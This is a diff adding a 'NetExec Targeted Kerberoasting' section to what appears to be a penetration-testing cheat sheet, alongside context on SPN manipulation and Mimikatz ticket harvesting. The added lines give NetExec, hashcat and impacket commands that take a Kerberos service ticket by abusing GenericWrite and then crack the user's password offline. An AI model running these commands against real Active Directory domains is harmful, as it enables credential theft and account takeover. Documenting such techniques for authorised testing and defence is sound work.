@@ -149,6 +149,18 @@ Set-DomainObject -Credential $Cred -Identity <user> -SET @{serviceprincipalname=
 Set-DomainObject -Credential $Cred -Identity <user> -Clear serviceprincipalname -Verbose
 ```
 
+### NetExec Targeted Kerberoasting
+
+When a controlled user has `GenericWrite` over another user, the observed NetExec command targeted that account, produced an etype 23 TGS, and left no SPN on the target afterward:
+
+```bash
+nxc ldap <DC_FQDN> -d <DOMAIN> -u <CONTROLLED_USER> -p '<PASSWORD>' --kerberoasting tgs.txt --targeted-kerberoast '<TARGET_USER>'
+hashcat -a0 -m 13100 tgs.txt <WORDLIST>
+impacket-GetUserSPNs -dc-ip <DC_IP> <DOMAIN>/<CONTROLLED_USER>
+```
+
+In the Delegate trace, Hashcat recovered the target user's password and `GetUserSPNs` then reported `No entries found!`.
+
 ### Harvest tickets from Windows
 
 With [Mimikatz](https://github.com/gentilkiwi/mimikatz):
